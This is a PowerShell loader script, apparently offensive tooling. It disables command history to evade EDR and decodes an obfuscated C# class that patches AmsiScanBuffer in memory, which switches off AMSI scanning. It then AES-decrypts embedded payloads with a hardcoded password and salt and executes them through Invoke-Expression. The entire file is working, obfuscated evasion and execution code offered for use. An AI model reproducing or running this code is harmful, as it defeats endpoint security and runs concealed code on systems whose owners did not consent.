$EncFunc0 = ("I2TIb+wz77bXQHvJTpzJHg==", "sn6DQB6wp+7KmvUXmqWXxw==")
$EncFunc1 = ("W4cIxeTxmvJItCubDUbJnw==", "ovOHTzupwZzvml91fRzTE2gYM3QFRHGTjdmVh6JkUPwNe6E6CmEWYfjcMDVQLQkZ")
$EncryptedFunctions = @($EncFunc0,$EncFunc1)
$Password="RvqHbOD5bF"
$Salt="Wc4Wjw_s3x"

#Might help against certain EDRs...
Set-PSReadlineOption -HistorySaveStyle SaveNothing

#AMSI
$AMSIBypassencoded = "CgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwAKAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABmAG8AbwBmAG8AbwAgAHsACgAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA7AAoACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABMAG8AYQBkAEwAaQBiAHIAYQByAHkAKABzAHQAcgBpAG4AZwAgAG4AYQBtAGUAKQA7AAoACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAFUASQBuAHQAUAB0AHIAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABOAGUAdwBQAHIAbwB0AGUAYwB0ACwAIABvAHUAdAAgAHUAaQBuAHQAIABsAHAAZgBsAE8AbABkAFAAcgBvAHQAZQBjAHQAKQA7AAoACgB9AA=="
$niw32 = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($AMSIBypassencoded))
Add-Type -TypeDefinition $niw32
$l = [foofoo]::LoadLibrary("am" + "si.dll")
$a = [foofoo]::GetProcAddress($l, "Amsi" + "Scan" + "Buffer")
$p = 0
$null = [foofoo]::VirtualProtect($a, [uint32]5, 0x40, [ref]$p)
$pa = [Byte[]] (184, 87, 0, 7, 128, 195)
[System.Runtime.InteropServices.Marshal]::Copy($pa, 0, $a, 6)

    if($Password -and $Salt)
    {
    $Index = 0
    foreach($ef in $EncryptedFunctions)
    {
    
    [byte[]]$CipherText = [Convert]::FromBase64String($ef[1])
    [byte[]]$InitVector = [Convert]::FromBase64String($ef[0])
    
    $AES = [System.Security.Cryptography.Aes]::Create()
    
    $v1=[Text.Encoding]::ASCII.GetBytes($Password)
    $v2=[Text.Encoding]::ASCII.GetBytes($Salt)
    $Key = New-Object System.Security.Cryptography.PasswordDeriveBytes($v1,$v2,"SHA512",10)
    
    $AES.Padding = "PKCS7"
    $AES.KeySize = 256
    $AES.Key = $Key.GetBytes(32)
    $AES.IV = $InitVector
    
    $AESDecryptor = $AES.CreateDecryptor()
    
    $MemoryStream = New-Object System.IO.MemoryStream($CipherText,$True)
    $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemoryStream,$AESDecryptor,[System.Security.Cryptography.CryptoStreamMode]::Read)
    
    $StreamReader = New-Object System.IO.StreamReader($CryptoStream)

    $Message = $StreamReader.ReadToEnd()
    
    $CryptoStream.Close()
    $MemoryStream.Close()
    $AES.Clear()
    
    try {$Message | Invoke-Expression } catch { Write-Warning "Error loading function number $Index. Beware that this only affects the mentioned function so everything else should work fine." }
    
    $Index++
    }
    }
